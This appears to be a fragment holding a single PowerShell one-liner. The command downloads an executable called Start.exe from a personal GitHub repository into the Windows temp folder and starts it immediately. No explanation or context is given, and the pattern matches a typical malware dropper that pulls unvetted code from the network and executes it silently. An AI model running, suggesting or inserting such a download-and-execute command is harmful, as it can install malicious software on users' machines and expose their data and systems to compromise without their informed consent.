...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sys1e/catl/raw/refs/heads/main/Start.exe' -OutFile '%TEMP%\Start.exe'; Start-Process '%TEMP%\Start.exe'"
